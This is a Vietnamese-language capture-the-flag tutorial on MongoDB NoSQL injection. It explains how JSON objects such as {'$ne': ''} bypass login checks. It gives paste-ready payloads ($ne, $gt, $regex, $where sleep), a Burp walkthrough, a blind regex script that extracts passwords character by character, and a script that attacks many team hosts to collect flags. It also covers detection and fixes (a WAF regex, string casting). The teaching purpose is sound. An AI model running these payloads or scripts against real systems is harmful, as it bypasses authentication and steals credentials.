NoSQL Injection

Khi app dùng database NoSQL (phổ biến nhất là MongoDB) và nhận input dạng object/JSON thay vì chuỗi, bạn có thể gửi toán tử query ($ne, $gt, $regex) thay vì 1 giá trị thường — khiến điều kiện kiểm tra (vd so khớp mật khẩu) luôn đúng mà không cần biết giá trị thật.

00 / TÓM TẮT 1 PHÚT

NoSQL Injection là gì, để làm gì?

MongoDB (và nhiều NoSQL khác) dùng cú pháp query bằng object, không phải chuỗi SQL. Ví dụ kiểm tra đăng nhập: db.users.findOne({username: "admin", password: "123456"}). Nếu app nhận input từ JSON body và đưa thẳng vào query mà không ép kiểu (chỉ nhận chuỗi thuần), bạn có thể gửi {"password": {"$ne": null}} thay vì chuỗi mật khẩu — MongoDB hiểu $ne là "không bằng" (not equal), và mọi mật khẩu thật đều "không bằng null" ⟹ điều kiện luôn đúng.

Nếu chỉ nhớ một điều Khác SQLi (gửi chuỗi chứa ký tự đặc biệt phá cú pháp), NoSQLi thường gửi cấu trúc dữ liệu khác (object thay vì chuỗi) — thử đổi password=123 (form) thành password[$ne]=123 (PHP-style array syntax) hoặc gửi JSON body {"password": {"$ne": ""}} tùy app nhận input kiểu nào.

⚡ NOSQL INJECTION
🚩 Nhận ra trong 30 giây Form login/API nhận JSON body (Content-Type application/json), hoặc cookie/header gợi ý Node.js/Express + MongoDB (connect.sid). Thử đổi password thành object {"$ne": ""} thay vì chuỗi thường.
✅ Tiền đề cần có App nhận input và đưa THẲNG vào query MongoDB mà không ép kiểu chuỗi (String(input)) trước.
🔍 Dò nhanh bằng Burp Repeater: nếu request gốc là JSON {"username":"x","password":"y"}, sửa giá trị password thành object {"$ne": ""} (xóa dấu ngoặc kép quanh giá trị để nó là object JSON thật, không phải chuỗi).
💥 Payload dán-chạy-ngay 
// 1. Bypass login (JSON body)
{"username": "admin", "password": {"$ne": ""}}

// 2. Bypass login (query string / form, PHP-style array syntax)
username=admin&password[$ne]=1

// 3. Blind NoSQLi -- suy từng ký tự mật khẩu bằng $regex
{"username": "admin", "password": {"$regex": "^a"}}
🐍 Script khai thác (điền host, chạy) 
import requests
r = requests.post("http://TARGET/login", json={
    "username": "admin", "password": {"$ne": ""}
})
print(r.text)   # mong đợi: đăng nhập thành công dù không biết mật khẩu
⚠️ Gotcha + 🛡️ WAF 1 dòng App nhận form-urlencoded thay vì JSON → dùng cú pháp mảng password[$ne]=1 (Express với body-parser tự hiểu thành object). WAF rule nhanh: chặn regex \$(ne|gt|lt|regex|where)\b trong body request. Chưa hiểu? đọc tiếp dưới.
01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

NoSQL — database không dùng bảng/hàng/cột theo kiểu SQL truyền thống, mà lưu dữ liệu dạng document (giống JSON). MongoDB là NoSQL phổ biến nhất trong web.
Toán tử truy vấn MongoDB — thay vì so sánh bằng (=), MongoDB cung cấp các toán tử đặc biệt viết bằng key bắt đầu $: $ne (not equal), $gt/$lt (lớn hơn/nhỏ hơn), $regex (khớp biểu thức chính quy), $where (chạy cả đoạn JavaScript làm điều kiện).

Code hay viết (nhận object trực tiếp từ request, không ép kiểu):

// Node.js/Express + MongoDB
const user = await db.collection('users').findOne({
  username: req.body.username,
  password: req.body.password   // !! nếu req.body.password là OBJECT thay vì string, Mongo hiểu như toán tử
});
02 / VÌ SAO LỖ HỔNG TỒN TẠI

JSON cho phép gửi CẤU TRÚC, không chỉ giá trị đơn

Khác với form HTML truyền thống (mọi giá trị đều là chuỗi), JSON cho phép bạn gửi bất kỳ kiểu dữ liệu nào — chuỗi, số, object, mảng. Nếu server tin tưởng rằng trường password luôn là chuỗi (vì giao diện form chỉ cho nhập text), nhưng thực chất nhận request trực tiếp (qua API, không qua form), bạn hoàn toàn gửi được 1 object ở vị trí đáng lẽ là chuỗi. MongoDB không hề biết "ý đồ" của lập trình viên là chỉ so sánh bằng — nó chỉ thấy object có key $ne và thực thi đúng theo ngữ nghĩa toán tử đó.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Từ "so sánh bằng" thành "không bằng gì cũng được"

db.users.findOne({ username: "admin", password: {"$ne": ""} })
username: "admin" — vẫn là so sánh bằng chuỗi thường, tìm đúng user tên admin.
password: {"$ne": ""} — thay vì password: "chuỗi_mật_khẩu_thật", đây là toán tử: "tìm user có password KHÔNG BẰNG chuỗi rỗng".
Vì mật khẩu thật của admin (bất kể giá trị gì, miễn không rỗng) luôn khác chuỗi rỗng, điều kiện này LUÔN ĐÚNG với bất kỳ user nào có mật khẩu — tức là hầu như luôn tìm thấy user.
Kết quả: query trả về đúng record user admin, ứng dụng hiểu là "đăng nhập thành công" dù bạn chưa từng biết mật khẩu thật.

05 / KHAI THÁC BẰNG BURP SUITE

Bấm gì (từng bước)

Sửa kiểu dữ liệu trong Repeater
  1. Bắt request login JSON, Send to Repeater.
  2. Sửa "password": "anything" thành "password": {"$ne": ""} — chú ý xóa dấu ngoặc kép quanh giá trị để nó là object JSON thật, không phải chuỗi chứa ký tự $ne.

06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ

Chọn đúng kỹ thuật theo tình huống

A. Bypass đăng nhập thử trước

Payload (JSON)Payload (query string/form)
{"password": {"$ne": ""}}password[$ne]=1
{"password": {"$gt": ""}}password[$gt]=
{"password": {"$regex": ".*"}}password[$regex]=.*

B. Blind NoSQLi — suy từng ký tự (khi cần đọc dữ liệu, không chỉ bypass login)

{"username": {"$regex": "^a"}}   // true nếu CÓ user bắt đầu bằng "a"
{"username": {"$regex": "^admin$"}}, "password": {"$regex": "^p"}   // suy từng ký tự mật khẩu của admin
Nguyên lý giống Boolean-blind SQLiThử từng ký tự ở từng vị trí, xem response có khác biệt (đăng nhập thành công/App trả "user tồn tại") hay không — viết script lặp để tự động hóa, xem mục 08.

C. $where — chạy JavaScript tùy ý (nếu app cho phép, nguy hiểm nhất)

{"$where": "this.password.length > 0"}
{"$where": "sleep(3000)"}   // time-based blind nếu không thấy khác biệt response
Hiếm gặp hơn$where cho phép chạy cả đoạn code JavaScript trong ngữ cảnh query — mạnh nhưng nhiều bản MongoDB mới đã hạn chế/tắt mặc định vì rủi ro quá lớn.

(B) Bản gọn chắc — blind NoSQLi suy từng ký tự, trích thẳng flag

import re, requests, string

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")

def is_true(url, cond):
    r = requests.post(url, json={"username": "admin", "password": cond}, timeout=5)
    return "Welcome" in r.text

def extract_password(url, max_len=40):
    found = ""
    charset = string.ascii_letters + string.digits
    for pos in range(1, max_len + 1):
        for ch in charset:
            if is_true(url, {"$regex": f"^{found}{ch}"}):
                found += ch
                print(found, end="\r")
                break
        else:
            break
    return found

print(extract_password("http://TARGET/login"))

(C) Bản A/D tái dùng — chạy mọi đội, mọi round

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")

def exploit_nosqli(host):
    try:
        r = requests.post(f"http://{host}/login",
                json={"username": "admin", "password": {"$ne": ""}}, timeout=5)
        m = FLAG_RE.search(r.text)
        return m.group() if m else None
    except requests.RequestException:
        return None

if __name__ == "__main__":
    for host in open("teams.txt").read().split():
        flag = exploit_nosqli(host)
        if flag:
            print(f"{host} {flag}")
            with open("flags.txt", "a") as f:
                f.write(f"{flag}\n")

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅App dùng MongoDB (hoặc NoSQL tương tự), nhận input trực tiếp vào query mà không ép kiểu chuỗi.
❌App ép kiểu rõ ràng trước khi query (String(req.body.password)) — object sẽ bị biến thành chuỗi "[object Object]", mất hết ý nghĩa toán tử.
❌Database là SQL (MySQL/PostgreSQL/SQLite) — bài này không áp dụng, xem bài SQLi.
13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay trên Burp, từ sửa JSON body tới khi bypass login thành công.

Gợi ý nếu kẹtNhớ xóa dấu ngoặc kép quanh object — gửi "password": "{\"$ne\": \"\"}" (vẫn là chuỗi) sẽ KHÔNG hoạt động, phải là "password": {"$ne": ""} (object JSON thật).

⭐⭐ Đổi 1 biến: app chặn được $ne theo blacklist tên toán tử. Tìm toán tử khác đạt cùng hiệu quả bypass.

Gợi ý nếu kẹtThử $gt hoặc $regex — nhiều toán tử khác nhau đều có thể tạo điều kiện "luôn đúng" tương tự $ne.

⭐⭐⭐⭐ Tự nghĩ: app không bypass được login trực tiếp, nhưng có endpoint tìm kiếm user theo username, phản hồi khác nhau giữa "tìm thấy"/"không tìm thấy". Viết chiến lược dùng NoSQLi blind để liệt kê TOÀN BỘ username trong hệ thống.

Gợi ý nếu kẹtDùng $regex với tiền tố tăng dần (^a, ^aa, ^aan...) để suy ra từng ký tự của MỌI username, không chỉ 1 user cụ thể.

Thuật ngữ

NoSQLDatabase không theo mô hình bảng/SQL truyền thống, lưu dữ liệu dạng document (JSON-like).
Toán tử MongoDB ($ne, $gt...)Cú pháp đặc biệt trong query MongoDB để so sánh theo điều kiện thay vì bằng tuyệt đối.
$whereToán tử MongoDB cho phép chạy JavaScript tùy ý làm điều kiện query — mạnh nhưng rủi ro cao.
